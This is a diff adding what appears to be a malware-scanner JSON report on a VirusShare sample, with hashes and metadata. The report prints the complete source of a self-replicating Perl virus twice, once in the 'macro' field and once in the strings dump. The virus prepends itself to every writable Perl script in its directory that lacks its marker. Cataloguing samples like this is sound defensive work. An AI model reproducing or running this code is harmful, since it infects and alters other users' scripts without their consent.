@@ -1,0 +1,50 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "open": "May open a file"
+        },
+        "macro": "#!/usr/bin/perl\n#h0egaard3n\nopen(File,$0);\n@vx=<File>;\nclose(File);\nforeach $Fichier (<*>){\nif ((-f $Fichier) && (-r $Fichier) && (-w $Fichier)){\nopen(File, \"$Fichier\");\n@Temp=<File>;\nclose(File);\nif (@Temp[0] =~ \"/perl\"){\nif (@Temp[1] ne \"\\#h0egaard3n\\n\"){\nopen(File, \">$Fichier\");\nprint File @vx[0 .. 16];\nprint File @Temp;\nclose (File);\n}}}}"
+    },
+    "filename": "VirusShare_1afc8ecf664bc05901dc96ae0b0c9769",
+    "filesize": 345,
+    "filetype": "Perl script text executable",
+    "hashes": {
+        "md5": "1afc8ecf664bc05901dc96ae0b0c9769",
+        "sha1": "cda5e2564608ac02dd8d66716f1f537c4062a450",
+        "sha256": "002661fbf79c380e0643f4d471fbb36cda7e8765482cf97be6ec6bd611179275"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "#!/usr/bin/perl",
+            "#h0egaard3n",
+            "open(File,$0);",
+            "@vx=<File>;",
+            "close(File);",
+            "foreach $Fichier (<*>){",
+            "if ((-f $Fichier) && (-r $Fichier) && (-w $Fichier)){",
+            "open(File, \"$Fichier\");",
+            "@Temp=<File>;",
+            "close(File);",
+            "if (@Temp[0] =~ \"/perl\"){",
+            "if (@Temp[1] ne \"\\#h0egaard3n\\n\"){",
+            "open(File, \">$Fichier\");",
+            "print File @vx[0 .. 16];",
+            "print File @Temp;",
+            "close (File);",
+            "}}}}"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.279454",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
